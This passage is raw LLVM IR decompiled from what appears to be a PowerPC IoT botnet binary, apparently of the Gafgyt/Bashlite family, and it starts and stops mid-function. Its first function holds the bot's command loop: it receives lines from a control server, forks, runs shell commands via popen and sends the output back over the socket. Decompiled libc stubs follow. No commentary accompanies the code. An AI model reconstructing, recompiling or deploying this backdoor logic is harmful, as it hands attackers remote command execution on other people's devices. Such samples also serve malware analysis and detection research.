  %v3_100073dc = call i32 @__GI_toupper(i32 %v4_100073cc, i32 %storemerge1445)
  %v1_100073ec = trunc i32 %v3_100073dc to i8
  store i8 %v1_100073ec, i8* %storemerge746, align 1
  %v1_100073f4 = add i32 %storemerge1445, 1
  %storemerge7 = inttoptr i32 %v1_100073f4 to i8*
  %v2_10007400 = load i8, i8* %storemerge7, align 1
  %v3_10007408 = icmp eq i8 %v2_10007400, 0
  br i1 %v3_10007408, label %dec_label_pc_10007410, label %dec_label_pc_100073c8

dec_label_pc_10007410:                            ; preds = %dec_label_pc_100073c8, %dec_label_pc_100073a4
  store i32 ptrtoint ([11 x i8]* @global_var_100122ac.544 to i32), i32* @r4, align 4
  %v4_10007420 = call i32 @__GI_strcoll(i8* %stack_var_-5780.029, i32 ptrtoint ([11 x i8]* @global_var_100122ac.544 to i32))
  %v3_10007428 = icmp eq i32 %v4_10007420, 0
  br i1 %v3_10007428, label %dec_label_pc_10007430, label %dec_label_pc_1000751c

dec_label_pc_10007430:                            ; preds = %dec_label_pc_10007410
  store i32 268465204, i32* @lr, align 4
  %v0_10007430 = call i32 @listFork()
  %v3_10007438 = icmp eq i32 %v0_10007430, 0
  br i1 %v3_10007438, label %dec_label_pc_10007440, label %dec_label_pc_100076a0.outer

dec_label_pc_10007440:                            ; preds = %dec_label_pc_10007430
  store i32 268465240, i32* @lr, align 4
  %v3_10007454 = call i32 @__GI_memset(i32 %v2_10007440, i32 0, i32 1024)
  %v4_10007474 = call i32 @szprintf(i32 %v2_10007440, i32 ptrtoint ([8 x i8]* @global_var_100122b8.545 to i32), i32 %v1_100073b4)
  store i32 268465296, i32* @lr, align 4
  %v3_1000748c = call i32 @fdpopen(i32 %v2_10007440, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_100121e8.523, i32 0, i32 0))
  br label %dec_label_pc_100074ec

dec_label_pc_1000749c:                            ; preds = %dec_label_pc_100074ec
  %v1_100074a4 = call i32 @trim(i32 %v2_10007440)
  %v3_100074ac = load i32, i32* @global_var_10024a20.27, align 4
  store i32 268465356, i32* @lr, align 4
  %v5_100074c8 = call i32 @Rootsprintf(i32 %v3_100074ac, i32 ptrtoint ([3 x i8]* @global_var_100122c0.546 to i32), i32 %v2_10007440)
  store i32 ptrtoint ([3 x i8]* @global_var_100074e4.547 to i32), i32* @lr, align 4
  %v3_100074e0 = call i32 @__GI_memset(i32 %v2_10007440, i32 0, i32 1024)
  store i32 268465388, i32* @lr, align 4
  %v1_100074e8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_100074ec

dec_label_pc_100074ec:                            ; preds = %dec_label_pc_10007440, %dec_label_pc_1000749c
  %v3_100074fc = call i32 @fdgets(i32 %v2_10007440, i32 1024, i32 %v3_1000748c)
  %v3_10007504 = icmp eq i32 %v3_100074fc, 0
  br i1 %v3_10007504, label %dec_label_pc_1000750c, label %dec_label_pc_1000749c

dec_label_pc_1000750c:                            ; preds = %dec_label_pc_100074ec
  %v1_10007510 = call i32 @fdpclose(i32 %v3_1000748c)
  %v0_10007518 = call i32 @__GI_exit()
  br label %dec_label_pc_1000751c

dec_label_pc_1000751c:                            ; preds = %dec_label_pc_10007410, %dec_label_pc_1000750c
  store i32 ptrtoint (i32* @global_var_100122c4.550 to i32), i32* @r4, align 4
  store i32 268465464, i32* @lr, align 4
  %v4_10007534 = call i32 @__GI_strtok(i32 %v1_100073b4, i32 ptrtoint (i32* @global_var_100122c4.550 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  store i32 %v1_100072d0, i32* %stack_var_-5472, align 4
  %v3_1000762c50 = icmp eq i32 %v4_10007534, 0
  br i1 %v3_1000762c50, label %dec_label_pc_10007634, label %dec_label_pc_1000754c

dec_label_pc_1000754c:                            ; preds = %dec_label_pc_1000751c, %dec_label_pc_10007610
  %stack_var_-5808.053.in = phi i32 [ %v4_1000761c, %dec_label_pc_10007610 ], [ %v4_10007534, %dec_label_pc_1000751c ]
  %stack_var_-5804.151 = phi i32 [ %stack_var_-5804.0, %dec_label_pc_10007610 ], [ 1, %dec_label_pc_1000751c ]
  %stack_var_-5808.053 = inttoptr i32 %stack_var_-5808.053.in to i8*
  %v2_10007550 = load i8, i8* %stack_var_-5808.053, align 1
  %v3_10007558 = icmp eq i8 %v2_10007550, 10
  br i1 %v3_10007558, label %dec_label_pc_10007610, label %dec_label_pc_10007560

dec_label_pc_10007560:                            ; preds = %dec_label_pc_1000754c
  store i32 %stack_var_-5804.151, i32* @r29, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_1000756c = call i32 @__GI_strlen()
  %v1_10007574 = add i32 %v0_1000756c, 1
  store i32 %v1_10007574, i32* @r3, align 4
  store i32 268465536, i32* @lr, align 4
  %v0_1000757c = call i32 @malloc()
  %v0_10007588 = load i32, i32* @r29, align 4
  %v1_10007588 = mul i32 %v0_10007588, 4
  %v1_10007594 = add i32 %v1_10007588, %v2_10007670
  %v2_10007598 = inttoptr i32 %v1_10007594 to i32*
  store i32 %v0_1000757c, i32* %v2_10007598, align 4
  %v1_100075a0 = mul i32 %stack_var_-5804.151, 4
  %v1_100075ac = add i32 %v1_100075a0, %v2_10007670
  %v1_100075b0 = inttoptr i32 %v1_100075ac to i32*
  %v2_100075b0 = load i32, i32* %v1_100075b0, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_100075bc = call i32 @__GI_strlen()
  %v1_100075c4 = add i32 %v0_100075bc, 1
  store i32 268465628, i32* @lr, align 4
  %v3_100075d8 = call i32 @__GI_memset(i32 %v2_100075b0, i32 0, i32 %v1_100075c4)
  %v2_100075f0 = load i32, i32* %v1_100075b0, align 4
  %v4_10007600 = call i32 @strcpy(i32 %v2_100075f0, i8* nonnull %stack_var_-5808.053)
  %v1_10007608 = add i32 %stack_var_-5804.151, 1
  br label %dec_label_pc_10007610

dec_label_pc_10007610:                            ; preds = %dec_label_pc_1000754c, %dec_label_pc_10007560
  %stack_var_-5804.0 = phi i32 [ %stack_var_-5804.151, %dec_label_pc_1000754c ], [ %v1_10007608, %dec_label_pc_10007560 ]
  store i32 ptrtoint (i32* @global_var_100122c4.550 to i32), i32* @r4, align 4
  store i32 268465696, i32* @lr, align 4
  %v4_1000761c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_100122c4.550 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v3_1000762c = icmp eq i32 %v4_1000761c, 0
  br i1 %v3_1000762c, label %dec_label_pc_10007634, label %dec_label_pc_1000754c

dec_label_pc_10007634:                            ; preds = %dec_label_pc_10007610, %dec_label_pc_1000751c
  %stack_var_-5804.1.lcssa = phi i32 [ 1, %dec_label_pc_1000751c ], [ %stack_var_-5804.0, %dec_label_pc_10007610 ]
  store i32 268465732, i32* @lr, align 4
  %v3_10007640 = call i32 @processCmd(i32 %stack_var_-5804.1.lcssa, i32* nonnull %stack_var_-5472)
  %tmp112 = icmp slt i32 %stack_var_-5804.1.lcssa, 2
  br i1 %tmp112, label %dec_label_pc_100076a0.outer, label %dec_label_pc_10007664.lr.ph

dec_label_pc_10007664.lr.ph:                      ; preds = %dec_label_pc_10007634
  store i32 1, i32* %stack_var_-5816, align 4
  br label %dec_label_pc_10007664

dec_label_pc_10007664:                            ; preds = %dec_label_pc_10007664.lr.ph, %dec_label_pc_10007664
  %v3_10007664 = phi i32 [ 1, %dec_label_pc_10007664.lr.ph ], [ %v1_10007688, %dec_label_pc_10007664 ]
  %v1_10007668 = mul i32 %v3_10007664, 4
  %v1_10007674 = add i32 %v2_10007670, %v1_10007668
  %v1_10007678 = inttoptr i32 %v1_10007674 to i32*
  %v2_10007678 = load i32, i32* %v1_10007678, align 4
  store i32 %v2_10007678, i32* @r3, align 4
  store i32 268465796, i32* @lr, align 4
  %v0_10007680 = call i32 @free()
  %v3_10007684 = load i32, i32* %stack_var_-5816, align 4
  %v1_10007688 = add i32 %v3_10007684, 1
  store i32 %v1_10007688, i32* %stack_var_-5816, align 4
  %v2_10007698 = icmp slt i32 %v1_10007688, %stack_var_-5804.1.lcssa
  br i1 %v2_10007698, label %dec_label_pc_10007664, label %dec_label_pc_100076a0.outer

dec_label_pc_100076a0.outer:                      ; preds = %dec_label_pc_10007664, %dec_label_pc_10007228, %dec_label_pc_10007430, %dec_label_pc_10007634, %dec_label_pc_10007288, %dec_label_pc_10006e40
  %stack_var_-5748.2.ph = phi i32 [ %stack_var_-5748.0.ph21, %dec_label_pc_10006e40 ], [ %stack_var_-5748.1, %dec_label_pc_10007288 ], [ %stack_var_-5748.1, %dec_label_pc_10007634 ], [ %stack_var_-5748.1, %dec_label_pc_10007430 ], [ %stack_var_-5748.1, %dec_label_pc_10007228 ], [ %stack_var_-5748.1, %dec_label_pc_10007664 ]
  br label %dec_label_pc_100076a0

dec_label_pc_100076a0:                            ; preds = %dec_label_pc_100076a0.outer, %dec_label_pc_100071b0
  %v3_100076a4 = load i32, i32* @global_var_10024a20.27, align 4
  %v5_100076b8 = call i32 @recvLine(i32 %v3_100076a4, i8* %v4_100076b8, i32 4096, i32 %v2_100076a8)
  %v4_100076cc = icmp eq i32 %v5_100076b8, -1
  br i1 %v4_100076cc, label %dec_label_pc_10006e24.outer, label %dec_label_pc_10007100

; uselistorder directives
  uselistorder i32 %v5_100076b8, { 1, 0 }
  uselistorder i32 %v1_10007688, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5804.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v4_1000761c, { 1, 0 }
  uselistorder i8* %stack_var_-5808.053, { 1, 0 }
  uselistorder i32 %stack_var_-5804.151, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_100073f4, { 1, 0 }
  uselistorder i32 %storemerge1445, { 1, 0 }
  uselistorder i8* %storemerge746, { 1, 0 }
  uselistorder i32 %v1_100073b4, { 1, 0 }
  uselistorder i8* %stack_var_-5780.029, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_100072d0, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_10007248, { 1, 0 }
  uselistorder i32 %v1_100071f8, { 1, 2, 0 }
  uselistorder i32 %v2_1000712c, { 1, 0 }
  uselistorder i32 %storemerge12, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge17, { 1, 0, 2 }
  uselistorder i32 %v1_10007034, { 1, 0 }
  uselistorder i32 %v0_10007018, { 1, 0 }
  uselistorder i32 %v3_10006fcc, { 1, 0 }
  uselistorder i32 %v1_10006ee4, { 1, 3, 0, 2 }
  uselistorder i32 %v2_10007670, { 2, 1, 0 }
  uselistorder i32 %v2_10007440, { 4, 2, 1, 3, 5, 0, 6 }
  uselistorder i8* %v4_100076b8, { 1, 0 }
  uselistorder i32 %v2_100076a8, { 5, 1, 0, 3, 4, 6, 7, 8, 2 }
  uselistorder i32 %v3_10006d20, { 1, 0, 2 }
  uselistorder i32 %v2_10006cac, { 1, 0, 2 }
  uselistorder i32 %v2_10006c84, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10006c4c, { 0, 2, 1 }
  uselistorder i32 %stack_var_-5756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_10006aec, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_-5816, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_100122c4.550 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_10024a28.44, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @Rootsprintf, { 15, 14, 13, 12, 11, 4, 3, 2, 1, 10, 9, 8, 7, 6, 5, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 1, 2, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder [2 x i8]* @global_var_100121e8.523, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_100121e8.523 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_100121d0.518 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100076a0.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_10007664, { 1, 0 }
  uselistorder label %dec_label_pc_10007610, { 1, 0 }
  uselistorder label %dec_label_pc_1000754c, { 1, 0 }
  uselistorder label %dec_label_pc_1000751c, { 1, 0 }
  uselistorder label %dec_label_pc_100074ec, { 1, 0 }
  uselistorder label %dec_label_pc_100073c8, { 1, 0 }
  uselistorder label %dec_label_pc_100073a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007390, { 1, 0 }
  uselistorder label %dec_label_pc_10007304, { 1, 0 }
  uselistorder label %dec_label_pc_10007260, { 1, 0 }
  uselistorder label %dec_label_pc_10007228, { 1, 0 }
  uselistorder label %dec_label_pc_1000716c, { 1, 0 }
  uselistorder label %dec_label_pc_100070f4, { 1, 0 }
  uselistorder label %dec_label_pc_10007070, { 1, 0 }
  uselistorder label %dec_label_pc_10007030, { 1, 0 }
  uselistorder label %dec_label_pc_10006f38, { 1, 0 }
  uselistorder label %dec_label_pc_10006ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10006e34, { 1, 0 }
  uselistorder label %dec_label_pc_10006e24.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006e04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006d68, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10006c48, { 1, 0 }
  uselistorder label %dec_label_pc_10006be8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_100076e8 = icmp eq i32 %arg2, -2143521772
  %v2_100076fc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100076fc, i32* %stack_var_-32, align 4
  br i1 %v4_100076e8, label %dec_label_pc_1000775c, label %dec_label_pc_1000771c

dec_label_pc_1000771c:                            ; preds = %entry
  %v3_1000771c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000771c, label %dec_label_pc_10007734, label %dec_label_pc_10007724

dec_label_pc_10007724:                            ; preds = %dec_label_pc_1000771c
  %v3_10007728 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10007728, label %dec_label_pc_10007750, label %dec_label_pc_1000777c

dec_label_pc_10007734:                            ; preds = %dec_label_pc_1000771c
  %v1_10007734 = xor i32 %arg2, -2143551488
  %v3_10007738 = icmp eq i32 %v1_10007734, 29717
  br i1 %v3_10007738, label %dec_label_pc_1000776c, label %dec_label_pc_10007740

dec_label_pc_10007740:                            ; preds = %dec_label_pc_10007734
  %v3_10007744 = icmp eq i32 %v1_10007734, 29718
  br i1 %v3_10007744, label %dec_label_pc_10007774, label %dec_label_pc_1000777c

dec_label_pc_10007750:                            ; preds = %dec_label_pc_10007724
  store i32 ptrtoint (i32* @global_var_10007758.551 to i32), i32* @lr, align 4
  %v1_10007754 = inttoptr i32 %arg3 to i32*
  %v2_10007754 = call i32 @__GI_tcgetattr(i32* %v1_10007754)
  br label %dec_label_pc_10007764

dec_label_pc_1000775c:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %dec_label_pc_10007774, %dec_label_pc_1000776c, %dec_label_pc_1000775c
  store i32 268466020, i32* @lr, align 4
  %v0_10007760 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_10007764

dec_label_pc_10007764:                            ; preds = %dec_label_pc_10007750, %dec_label_pc_10007760
  %storemerge = phi i32 [ %v0_10007760, %dec_label_pc_10007760 ], [ %v2_10007754, %dec_label_pc_10007750 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100077a8

dec_label_pc_1000776c:                            ; preds = %dec_label_pc_10007734
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10007760

dec_label_pc_10007774:                            ; preds = %dec_label_pc_10007740
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10007760

dec_label_pc_1000777c:                            ; preds = %dec_label_pc_10007740, %dec_label_pc_10007724
  %v0_1000778c = call i32 @__asm_mfcr()
  %v1_10007790 = and i32 %v0_1000778c, 268435456
  %v3_10007790 = icmp eq i32 %v1_10007790, 0
  store i32 %v0_1000778c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007790, label %dec_label_pc_100077a8, label %dec_label_pc_1000779c

dec_label_pc_1000779c:                            ; preds = %dec_label_pc_1000777c
  %v0_1000779c = call i32 @__errno_location()
  %v0_100077a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100077a0 = inttoptr i32 %v0_1000779c to i32*
  store i32 %v0_100077a0, i32* %v2_100077a0, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100077a8

dec_label_pc_100077a8:                            ; preds = %dec_label_pc_1000777c, %dec_label_pc_10007764, %dec_label_pc_1000779c
  %v0_100077ac = phi i32 [ %v0_1000778c, %dec_label_pc_1000777c ], [ %storemerge, %dec_label_pc_10007764 ], [ -1, %dec_label_pc_1000779c ]
  ret i32 %v0_100077ac

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100077a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007764, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_100077c8 = load i32, i32* @lr, align 4
  %v1_100077c8 = load i1, i1* @cr0_so, align 1
  %v2_100077c8 = xor i1 %v1_100077c8, true
  call void @__pseudo_cond_branch(i1 %v2_100077c8, i32 %v0_100077c8)
  %v0_100077cc = call i32 @__syscall_error()
  ret i32 %v0_100077cc
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100077e4 = add i32 %arg2, -12
  %v2_100077e8 = icmp ugt i32 %v1_100077e4, 2
  %v2_100077f0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100077f0, i32* %stack_var_-32, align 4
  br i1 %v2_100077e8, label %dec_label_pc_1000781c, label %dec_label_pc_1000780c

dec_label_pc_1000780c:                            ; preds = %entry
  store i32 268466196, i32* @lr, align 4
  %v2_10007810 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_10007810, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000783c

dec_label_pc_1000781c:                            ; preds = %entry
  %v0_10007820 = call i32 @__asm_mfcr()
  %v1_10007824 = and i32 %v0_10007820, 268435456
  %v3_10007824 = icmp eq i32 %v1_10007824, 0
  store i32 %v0_10007820, i32* %r31.global-to-local, align 4
  br i1 %v3_10007824, label %dec_label_pc_1000783c, label %dec_label_pc_10007830

dec_label_pc_10007830:                            ; preds = %dec_label_pc_1000781c
  %v0_10007830 = call i32 @__errno_location()
  %v0_10007834 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007834 = inttoptr i32 %v0_10007830 to i32*
  store i32 %v0_10007834, i32* %v2_10007834, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000783c

dec_label_pc_1000783c:                            ; preds = %dec_label_pc_1000781c, %dec_label_pc_1000780c, %dec_label_pc_10007830
  %v0_10007840 = phi i32 [ %v0_10007820, %dec_label_pc_1000781c ], [ %v2_10007810, %dec_label_pc_1000780c ], [ -1, %dec_label_pc_10007830 ]
  ret i32 %v0_10007840

; uselistorder directives
  uselistorder label %dec_label_pc_1000783c, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000786c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000786c, i32* %stack_var_-32, align 4
  %v0_10007888 = call i32 @__asm_mfcr()
  %v1_1000788c = and i32 %v0_10007888, 268435456
  %v3_1000788c = icmp eq i32 %v1_1000788c, 0
  store i32 %v0_10007888, i32* %r31.global-to-local, align 4
  br i1 %v3_1000788c, label %dec_label_pc_100078a4, label %dec_label_pc_10007898

dec_label_pc_10007898:                            ; preds = %entry
  %v0_10007898 = call i32 @__errno_location()
  %v0_1000789c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000789c = inttoptr i32 %v0_10007898 to i32*
  store i32 %v0_1000789c, i32* %v2_1000789c, align 4
  br label %dec_label_pc_100078a4

dec_label_pc_100078a4:                            ; preds = %entry, %dec_label_pc_10007898
  %v0_100078b4 = phi i32 [ %v0_10007888, %entry ], [ -1, %dec_label_pc_10007898 ]
  ret i32 %v0_100078b4

; uselistorder directives
  uselistorder label %dec_label_pc_100078a4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_100078cc

dec_label_pc_100078cc:                            ; preds = %dec_label_pc_100078cc.backedge, %entry
  %v0_100078d8 = call i32 @__asm_mfcr()
  %v1_100078dc = and i32 %v0_100078d8, 268435456
  %v3_100078dc = icmp eq i32 %v1_100078dc, 0
  store i32 %v0_100078d8, i32* %r31.global-to-local, align 4
  br i1 %v3_100078dc, label %dec_label_pc_100078cc.backedge, label %dec_label_pc_100078e8

dec_label_pc_100078e8:                            ; preds = %dec_label_pc_100078cc
  %v0_100078e8 = call i32 @__errno_location()
  %v0_100078ec = load i32, i32* %r31.global-to-local, align 4
  %v2_100078ec = inttoptr i32 %v0_100078e8 to i32*
  store i32 %v0_100078ec, i32* %v2_100078ec, align 4
  br label %dec_label_pc_100078cc.backedge

dec_label_pc_100078cc.backedge:                   ; preds = %dec_label_pc_100078e8, %dec_label_pc_100078cc
  br label %dec_label_pc_100078cc
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000790c = call i32 @__asm_mfcr()
  %v1_10007910 = and i32 %v0_1000790c, 268435456
  %v3_10007910 = icmp eq i32 %v1_10007910, 0
  store i32 %v0_1000790c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007910, label %dec_label_pc_10007928, label %dec_label_pc_1000791c

dec_label_pc_1000791c:                            ; preds = %entry
  %v0_1000791c = call i32 @__errno_location()
  %v0_10007920 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007920 = inttoptr i32 %v0_1000791c to i32*
  store i32 %v0_10007920, i32* %v2_10007920, align 4
  br label %dec_label_pc_10007928

dec_label_pc_10007928:                            ; preds = %entry, %dec_label_pc_1000791c
  %v0_10007938 = phi i32 [ %v0_1000790c, %entry ], [ -1, %dec_label_pc_1000791c ]
  ret i32 %v0_10007938

; uselistorder directives
  uselistorder label %dec_label_pc_10007928, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007954 = call i32 @__asm_mfcr()
  %v1_10007958 = and i32 %v0_10007954, 268435456
  %v3_10007958 = icmp eq i32 %v1_10007958, 0
  store i32 %v0_10007954, i32* %r31.global-to-local, align 4
  br i1 %v3_10007958, label %dec_label_pc_10007970, label %dec_label_pc_10007964

dec_label_pc_10007964:                            ; preds = %entry
  %v0_10007964 = call i32 @__errno_location()
  %v0_10007968 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007968 = inttoptr i32 %v0_10007964 to i32*
  store i32 %v0_10007968, i32* %v2_10007968, align 4
  br label %dec_label_pc_10007970

dec_label_pc_10007970:                            ; preds = %entry, %dec_label_pc_10007964
  %v0_10007980 = phi i32 [ %v0_10007954, %entry ], [ -1, %dec_label_pc_10007964 ]
  ret i32 %v0_10007980

; uselistorder directives
  uselistorder label %dec_label_pc_10007970, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000799c = call i32 @__asm_mfcr()
  %v1_100079a0 = and i32 %v0_1000799c, 268435456
  %v3_100079a0 = icmp eq i32 %v1_100079a0, 0
  store i32 %v0_1000799c, i32* %r31.global-to-local, align 4
  br i1 %v3_100079a0, label %dec_label_pc_100079b8, label %dec_label_pc_100079ac

dec_label_pc_100079ac:                            ; preds = %entry
  %v0_100079ac = call i32 @__errno_location()
  %v0_100079b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100079b0 = inttoptr i32 %v0_100079ac to i32*
  store i32 %v0_100079b0, i32* %v2_100079b0, align 4
  br label %dec_label_pc_100079b8

dec_label_pc_100079b8:                            ; preds = %entry, %dec_label_pc_100079ac
  %v0_100079c8 = phi i32 [ %v0_1000799c, %entry ], [ -1, %dec_label_pc_100079ac ]
  ret i32 %v0_100079c8

; uselistorder directives
  uselistorder label %dec_label_pc_100079b8, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100079e4 = call i32 @__asm_mfcr()
  %v1_100079e8 = and i32 %v0_100079e4, 268435456
  %v3_100079e8 = icmp eq i32 %v1_100079e8, 0
  store i32 %v0_100079e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100079e8, label %dec_label_pc_10007a00, label %dec_label_pc_100079f4

dec_label_pc_100079f4:                            ; preds = %entry
  %v0_100079f4 = call i32 @__errno_location()
  %v0_100079f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100079f8 = inttoptr i32 %v0_100079f4 to i32*
  store i32 %v0_100079f8, i32* %v2_100079f8, align 4
  br label %dec_label_pc_10007a00

dec_label_pc_10007a00:                            ; preds = %entry, %dec_label_pc_100079f4
  %v0_10007a10 = phi i32 [ %v0_100079e4, %entry ], [ -1, %dec_label_pc_100079f4 ]
  ret i32 %v0_10007a10

; uselistorder directives
  uselistorder label %dec_label_pc_10007a00, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_10007a20 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10007a30 = icmp eq i32 %arg1, 0
  br i1 %v3_10007a20, label %dec_label_pc_10007a30, label %dec_label_pc_10007a64

dec_label_pc_10007a30:                            ; preds = %entry
  br i1 %v3_10007a30, label %dec_label_pc_10007a4c, label %dec_label_pc_10007a38

dec_label_pc_10007a38:                            ; preds = %dec_label_pc_10007a30
  %v0_10007a38 = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_10007a44 = inttoptr i32 %v0_10007a38 to i32*
  store i32 22, i32* %v2_10007a44, align 4
  br label %dec_label_pc_10007afc

dec_label_pc_10007a4c:                            ; preds = %dec_label_pc_10007a30
  store i32 268466768, i32* @lr, align 4
  %v0_10007a4c = call i32 @__GI_getpagesize()
  %v1_10007a50 = icmp slt i32 %v0_10007a4c, 4096
  %v0_10007a54. = select i1 %v1_10007a50, i32 4096, i32 %v0_10007a4c
  store i32 %v0_10007a54., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007a74

dec_label_pc_10007a64:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10007a30, label %dec_label_pc_10007a74, label %dec_label_pc_10007a84

dec_label_pc_10007a74:                            ; preds = %dec_label_pc_10007a4c, %dec_label_pc_10007a64
  %v0_10007a74 = phi i32 [ %v0_10007a54., %dec_label_pc_10007a4c ], [ %arg2, %dec_label_pc_10007a64 ]
  store i32 %v0_10007a74, i32* @r3, align 4
  store i32 268466812, i32* @lr, align 4
  %v0_10007a78 = call i32 @malloc()
  store i32 %v0_10007a78, i32* @r29, align 4
  %v3_10007a7c = icmp eq i32 %v0_10007a78, 0
  br i1 %v3_10007a7c, label %dec_label_pc_10007af8, label %dec_label_pc_10007a74.dec_label_pc_10007a84_crit_edge

dec_label_pc_10007a74.dec_label_pc_10007a84_crit_edge: ; preds = %dec_label_pc_10007a74
  br label %dec_label_pc_10007a84

dec_label_pc_10007a84:                            ; preds = %dec_label_pc_10007a74.dec_label_pc_10007a84_crit_edge, %dec_label_pc_10007a64
  %v0_10007a94 = call i32 @__asm_mfcr()
  %v1_10007a98 = and i32 %v0_10007a94, 268435456
  %v3_10007a98 = icmp eq i32 %v1_10007a98, 0
  store i32 %v0_10007a94, i32* %r31.global-to-local, align 4
  store i32 %v0_10007a94, i32* @r4, align 4
